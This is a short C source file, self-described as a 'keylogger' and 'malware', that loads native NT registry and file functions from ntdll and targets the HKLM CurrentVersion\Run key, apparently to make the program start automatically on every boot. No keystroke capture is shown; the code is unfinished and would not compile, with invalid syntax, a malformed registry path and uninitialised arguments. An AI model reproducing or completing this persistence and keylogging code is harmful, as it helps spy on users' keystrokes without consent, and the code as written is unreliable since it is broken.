#include <stdio.h>
#include <windows.h>
#include <conio.h>
#include "lowkey.h"

// lowks keylogger
// unfunny malware
// heart heart heart

// by peroxidee

#define k(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define w(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
#define i(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)

HMODULE getMod(LPCWSTR modName) {
    HMODULE hModule = NULL;
    i("trying to get a handle to %S", modName);

    hModule = GetModuleHandleW(modName);

    if (hModule == NULL) {
        w("failed to get a handle to the module. error: 0x%lx\n", GetLastError());
        return NULL;
    }

    else {
        k("got a handle to the module!");
        i("\\___[ %S\n\t\\_0x%p]\n", modName, hModule);
        return hModule;
    }
}




int main(void) {

    NTSTATUS status = NULL;
    PVOID rBuffer = NULL;
    HANDLE hProc = NULL;
    HANDLE hThread = NULL;
    HMODULE hNTDLL = NULL;


    hNTDLL = GetModuleHandleA("ntdll.dll");
    const NtCreateFile _NtCreateFile = (NtCreateFile)GetProcAddress(hNTDLL, "NtCreateFile");
    const NtWriteFile _NtWriteFile = (NtWriteFile)GetProcAddress(hNTDLL,
        "NtWriteFile");
    const NtOpenKey _NtOpenKey = (NtOpenKey)GetProcAddress(hNTDLL,
     "NtOpenKey");
    const NtCreateKey _NtCreateKey = (NtCreateKey)GetProcAddress(hNTDLL,
      "NtCreateKey");

    char path[MAX_PATH];

    DWORD result = GetModuleFileName(NULL, path, MAX_PATH);


    UNICODE_STRING registryPath;
    String str = (&registryPath, L"Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");

    HANDLE hw;
    POBJECT_ATTRIBUTES wl;
    ACCESS_MASK am;


    status = _NtOpenKey(&hw, am, wl);


    _NtCreateKey(&hw,am, wl, NULL, );

    return 0;
}



